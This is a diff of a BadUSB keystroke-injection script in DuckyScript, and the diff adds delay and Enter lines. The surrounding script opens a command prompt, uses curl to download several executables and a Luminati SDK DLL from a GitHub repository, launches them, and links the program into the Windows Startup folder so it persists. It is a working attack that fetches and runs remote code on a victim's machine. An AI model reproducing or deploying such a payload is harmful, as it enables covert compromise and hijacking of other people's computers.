@@ -5,5 +5,9 @@ DELAY 500
 STRING cmd
 ENTER
 STRING cd C:\Program Files (x86)
+DELAY 500
+ENTER
 STRING mkdir MouseServer.exe
+DELAY 500
+enter
 STRING cd MouseServer.exe && curl -o MouseServerLuminati.exe https://raw.githubusercontent.com/entitybtw/BadUsbMserver/main/Mouse%20Server%20Luminati.exe && curl -o MouseServer.exe https://raw.githubusercontent.com/entitybtw/BadUsbMserver/main/MouseServer.exe && curl -o lum_sdk32.dll https://raw.githubusercontent.com/entitybtw/BadUsbMserver/main/lum_sdk32.dll && curl -o net_updater32.exe https://raw.githubusercontent.com/entitybtw/BadUsbMserver/main/net_updater32.exe && curl -o unins000.dat https://raw.githubusercontent.com/entitybtw/BadUsbMserver/main/unins000.dat && curl -o unins000.exe https://raw.githubusercontent.com/entitybtw/BadUsbMserver/main/unins000.exe && start MouseServer.exe && cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup && mklink "Mouse Server.lnk" "C:\Program Files (x86)\MouseServer.exe\MouseServer.exe"
